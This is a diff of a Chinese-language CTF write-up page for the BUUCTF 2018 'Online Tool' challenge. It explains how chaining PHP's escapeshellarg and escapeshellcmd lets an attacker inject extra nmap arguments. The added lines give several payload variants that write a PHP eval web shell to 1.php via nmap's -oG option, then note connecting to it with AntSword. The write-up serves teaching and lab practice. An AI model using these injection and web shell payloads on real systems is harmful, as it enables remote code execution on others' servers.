@@ -88,14 +88,16 @@ if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
 </li>
 </ul>
 <h3 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg(),escapeshellcmd()"></a>escapeshellarg(),escapeshellcmd()</h3><ol>
-<li>传入的参数是：172.17.0.2’ -v -d a=1</li>
+<li>传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
 <li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
 <li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对\以及最后那个不配对儿的引号进行了转义：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
 <li>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</li>
 </ol>
-<pre><code>?host=' &lt;?php @eval($_POST[1]);?&gt; -oG 1.php '</code></pre>
+<pre><code>?host='&lt;?php @eval($_POST[1]);?&gt; -oG 1.php '</code></pre>
 <p><img src="/2021/06/19/buuctf-2018-onlinetool/image-20210619161912899.png" alt="image-20210619161912899"></p>
-<pre><code>'\\'' &lt;?php @eval($_POST[1]);?&gt; -oG 1.php '\\''</code></pre>
+<pre><code>'&lt;?php eval($_POST[1]);?&gt; -oG 1.php '</code></pre>
+<pre><code>/"/&lt;/?php @eval/(/$_POST/[1/]/);/?/&gt; -oG 1.php/"</code></pre>
+<pre><code>nmap -T5 -sT -Pn --host-timeout 2 -F ' &lt;?php @eval($_POST[1]);?&gt; -oG 1.php '</code></pre>
 <p>蚁剑连接：</p>
 <pre><code>url/3e12369d084243c43ba31e472a06c3f7/1.php</code></pre>
 <p><img src="/2021/06/19/buuctf-2018-onlinetool/image-20210619162043015.png" alt="image-20210619162043015"></p>
